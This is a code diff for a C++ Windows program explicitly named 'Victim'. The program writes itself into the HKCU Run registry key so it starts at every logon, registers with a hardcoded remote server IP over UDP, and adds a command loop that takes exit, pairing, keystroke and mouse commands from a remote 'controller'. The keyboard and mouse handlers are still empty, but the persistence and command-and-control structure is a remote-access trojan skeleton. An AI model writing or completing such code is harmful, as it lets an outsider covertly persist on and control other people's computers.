@@ -3,10 +3,20 @@
 #include <iostream>
 #include <thread>
 #include <Windows.h>
-#include "victim.h"
 
 #define SERVER_IP "2.235.241.210"
 #define SERVER_PORT 2390
+
+/* possible messages form server:
+* a: accepted
+* e: exit
+* c: connected with controller
+* d: diconnected from controller
+* p: key pressed
+* r: key released
+* s: mouse scroll
+* m: mouse move
+*/
 
 int main()
 {
@@ -23,6 +33,7 @@ int main()
     LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);   
     LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
 
+    bool isPaired = false; //with controller
     sf::UdpSocket ard;
     std::string init = "v" + std::to_string(int(Mlib::getTime()/1000));
     ard.send(init.c_str(), init.size()+1, SERVER_IP, SERVER_PORT);
@@ -33,14 +44,60 @@ int main()
     sf::IpAddress ip;
     unsigned short port;
     ard.bind(sf::Socket::AnyPort);
-    ard.bind(ard.getLocalPort());
     char buf[1];
     ard.receive(buf, sizeof(buf), size, ip, port);
 
-    if (ip != SERVER_IP || size != 1)
+    if (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'a')
         goto connect;
 
-    return 0;
+    while (true)
+    {
+        char msg[10];
+        ard.receive(msg, sizeof(msg), size, ip, port);
+        if (ip != SERVER_IP || port != SERVER_PORT)
+            continue;
+
+        //exit program
+        if (msg[0] == 'e')
+        {
+            return 0;
+        }
+        //connected with controller
+        else if (msg[0] == 'c')
+        {
+            isPaired = true;
+        }
+        //disconnected from controller
+        else if (msg[0] == 'd')
+        {
+            isPaired = false;
+        }
+        else if (isPaired)
+        {
+            //key pressed
+            if (msg[0] == 'p')
+            {
+
+            }
+            //key released
+            else if (msg[0] == 'r')
+            {
+
+            }
+            //mouse moved
+            else if (msg[0] == 'm')
+            {
+
+            }
+            //mouse scrolled
+            else if (msg[0] == 's')
+            {
+
+            }
+        }
+    }
+
+    return -1;
 }
 
 /*{
